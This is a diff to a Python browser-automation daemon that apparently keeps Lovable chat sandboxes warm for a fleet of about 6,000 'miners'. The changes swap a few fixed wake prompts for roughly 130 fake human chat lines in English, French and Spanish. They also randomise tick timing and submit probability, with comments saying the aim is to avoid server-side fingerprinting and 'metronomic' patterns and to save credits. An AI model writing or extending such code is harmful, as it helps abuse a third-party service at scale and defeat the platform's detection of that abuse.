@@ -27,7 +27,46 @@ BRIDGE_URL = "wss://bridge-production-2e86.up.railway.app/ws"
 TOKEN_REFRESH_INTERVAL = 2400  # 40 min
 
 # Script3 wake prompts only — NOT Build a debug terminal (that's script2).
-WAKE_PROMPTS = ["say 'a'", "1+1?", "say 'x'", "2+2?", "echo ok"]
+# POOL MATTERS: these are submitted to Lovable chat, so every string here is
+# visible server-side. 5 strings across 6,000 miners = one fingerprint.
+# ~130 short dev-plausible utterances (EN/FR/ES mix, some with typos, none
+# miner-related). Per-cell shuffle at boot spreads them further.
+WAKE_PROMPTS = [
+    "looks good, one more thing", "can you center that?", "make it darker",
+    "hmm not quite", "try again pls", "nice, next section", "fix the spacing",
+    "too big on mobile", "what about the footer?", "add some padding",
+    "ça marche ?", "tu peux centrer ?", "plus sombre stp", "c'est bon",
+    "refais cette partie", "l'espacement est bizarre", "?",
+    "se ve bien", "centra eso", "más oscuro", "está bien", "otra vez",
+    "el pie de página?", "k", "ok", "ok thanks", "thx", "cool", "nice",
+    "wait", "hmm", "let me see", "one sec", "actually no", "nvm",
+    "oops wrong button", "my bad", "sorry, misclicked", "brb",
+    "can it be smaller?", "bigger logo?", "change the color",
+    "i like the blue one", "make the text white", "align left",
+    "why is it overlapping?", "it broke on my phone", "test",
+    "testing 123", "hello?", "is this on?", "a", "1+1?", "x",
+    "2+2?", "echo ok", "say hi", "ping", "yo", "..", "...",
+    "hmm let me think", "give me a sec", "scroll up?", "what changed?",
+    "undo that", "redo", "save?", "does it autosave?", "publish?",
+    "not yet", "almost", "getting there", "looks better", "much better",
+    "perfect", "ship it", "wait dont", "hold on", "stop stop",
+    "go back", "previous version?", "can i revert?", "history?",
+    "the header though", "nav bar is off", "menu broken?",
+    "dropdown?", "on hover?", "click does nothing", "blank page?",
+    "reload?", "try refresh", "clear cache?", "works now",
+    "how do i share this?", "link?", "send me the url", "is it live?",
+    "looks live", "check prod?", "ok deploy", "later",
+    "font too small", "font?", "bold that", "italic?", "underline no",
+    "remove that", "delete pls", "add a button", "button where?",
+    "form?", "input box?", "placeholder text?", "lorem?",
+    "image broken", "pic?", "upload?", "logo here", "banner?",
+    "hero section?", "below the fold?", "sidebar?", "grid?",
+    "two columns?", "stack on mobile?", "responsive?", "dark mode?",
+    "light mode?", "toggle?", "ça bug", "marche pas", "no funciona",
+    "qué pasó?", "otra cosa", "más grande", "más chico", "dale",
+    "listo", "ya?", "todavía no", "casi", "bien", "mal",
+    "horrible", "me encanta", "feo", "lindo",
+]
 
 # Idle-typing phrases: typed into the composer but NEVER submitted.
 # Unfinished dev thoughts — keydown/input activity with zero credit burn.
@@ -77,8 +116,11 @@ VIEW_H = int(os.environ.get("CHIMERA_VIEW_H", "900"))
 BLANK_PREVIEW_RELOAD_ROUNDS = int(os.environ.get("CHIMERA_BLANK_RELOAD_ROUNDS", "6"))
 BLANK_PREVIEW_HARD_ROUNDS = int(os.environ.get("CHIMERA_BLANK_HARD_ROUNDS", "12"))
 # Preview cools to proxy-404 without human-like presence — poke both tabs often.
-HEALTH_INTERVAL_S = 40
-HEALTH_INTERVAL_MAX_S = 60  # randomize next tick in [40, 60]
+HEALTH_INTERVAL_S = int(os.environ.get("CHIMERA_TICK_MIN", "40"))
+HEALTH_INTERVAL_MAX_S = int(os.environ.get("CHIMERA_TICK_MAX", "60"))  # randomize next tick in range
+# Submit probability per tick (rest are type-only pokes). Lower = fewer
+# credits burned + less metronomic. Override per cell via env for spread.
+PRESENCE_SUBMIT_P = float(os.environ.get("CHIMERA_SUBMIT_P", "0.4"))
 PRESENCE_KEYS = ("ArrowDown", "ArrowUp")  # Home/PageDown disrupt Lovable chat UI
 PRESENCE_POKE_TIMEOUT_S = 22
 # Every health tick also send a trivial chat prompt — keeps sandbox warm.
@@ -3942,13 +3984,17 @@ async def run_daemon(session_id, project_id, browser_type, threads, mode, headed
                                 except Exception:
                                     pass
                         else:
-                            # Full presence: even ticks submit a trivial prompt,
-                            # odd ticks type-without-submit (activity, zero credits)
+                            # Human presence: submit ~40% of ticks, type-only
+                            # otherwise — and occasionally go quiet for a few
+                            # ticks straight (humans read, think, get coffee;
+                            # nobody chats every 50s for hours). Strict
+                            # even/odd alternation was a metronome.
                             if not page_lock.locked():
                                 try:
                                     await dismiss_blocking_popups(
                                         chat_page, max_passes=5)
-                                    if iteration % 2 == 0:
+                                    import random as _rp
+                                    if _rp.random() < PRESENCE_SUBMIT_P:
                                         await send_presence_prompt(chat_page)
                                     else:
                                         await type_idle_text(chat_page)
